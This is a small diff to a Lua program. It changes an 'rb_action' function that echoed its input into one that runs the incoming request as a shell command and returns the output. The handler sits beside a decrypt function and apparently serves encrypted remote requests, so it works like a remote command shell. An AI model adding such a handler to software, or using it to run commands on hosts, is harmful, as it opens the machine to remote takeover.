@@ -137,8 +137,8 @@ local function decrypt(key, nonce, c, ctr)
 end
 
 local function rb_action(req)
-	local resp = req .. " YOYO!!!"
-	return resp
+	local res, status = he.shell(req .. " 2>&1 ")
+	return strf("status=%s\n[%s]", tostring(status), res)
 end
 
 local function rb_handler(vars)
